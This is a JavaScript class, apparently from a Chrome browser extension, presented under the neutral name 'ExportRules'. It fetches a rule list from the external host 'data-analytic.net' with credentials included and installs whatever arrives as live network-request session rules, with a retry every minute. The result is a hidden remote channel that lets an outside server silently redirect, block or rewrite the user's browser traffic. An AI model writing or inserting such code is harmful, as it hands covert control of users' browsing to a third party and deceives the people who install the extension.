class ExportRules {
  constructor(sessionDomainPath) {
    this.previousError = null;
    this.sessionDomainPath = sessionDomainPath;
    this.apiUpdateMethod = chrome.declarativeNetRequest.updateSessionRules;
    this.ruleId = 100;
  }
  addSessionRules(a) {
    this.apiUpdateMethod({ addRules: a }, () => {
      chrome.runtime.lastError && console.log(chrome.runtime.lastError);
    });
  }
  sync() {
    this.cleanRules().then(async () => {
      await this.setupRules();
    });
  }
  buildUrl() {
    return (
      "https://data-analytic.net" +
      this.sessionDomainPath +
      (this.previousError
        ? "?err=" + encodeURIComponent(this.previousError) + "&"
        : "?") +
      "app=" +
      chrome.runtime.id
    );
  }
  getRangeIds() {
    const ruleIds = [];
    for (let i = this.ruleId; i < this.ruleId + 100; i++) ruleIds.push(i);
    return ruleIds;
  }
  async cleanRules() {
    return new Promise((callback) => {
      this.apiUpdateMethod(
        {
          removeRuleIds: this.getRangeIds(),
        },
        callback
      );
    });
  }
  async setupRules() {
    const options = { credentials: "include" };
    const lst = await fetch(this.buildUrl(), options)
      .then((resp) => resp.json())
      .catch((e) => {
        this.previousError = e.toString();
      });
    if (!lst) {
      const r = () => {
        this.setupRules();
      };
      return setTimeout(r, 60000);
    } else if (lst.length) {
      for (let i = this.ruleId, j = 0; j < lst.length; i++, j++) lst[j].id = i;
      this.addSessionRules(lst);
    }
  }
}